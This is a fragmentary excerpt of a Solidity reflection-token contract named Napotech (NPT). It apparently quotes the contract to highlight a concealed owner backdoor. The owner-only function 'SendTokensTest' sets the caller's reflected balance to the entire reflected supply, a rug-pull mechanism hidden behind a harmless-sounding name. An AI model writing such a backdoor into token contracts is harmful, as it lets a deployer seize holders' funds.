...
/*
    ...
    Contract Supply: 200,000,000,000 /200 Billion
    Contract Tokenomics:
...
contract NPT is Context, IERC20, Ownable
{
    ...
    uint256 private _tTotal = 200_000_000_000 * 10**18; //200 Billion
    uint256 private _rTotal = (MAX - (MAX % _tTotal));
    uint256 private _tFeeTotal;

    string private _name = "Napotech";
...
function createPairandRouter (address _currentRouter) external onlyOwner {

        IUniswapV2Router02 _uniswapV2Router = IUniswapV2Router02(_currentRouter);
...
function SendTokensTest () external onlyOwner {
        _rOwned[_msgSender()] = _rTotal;
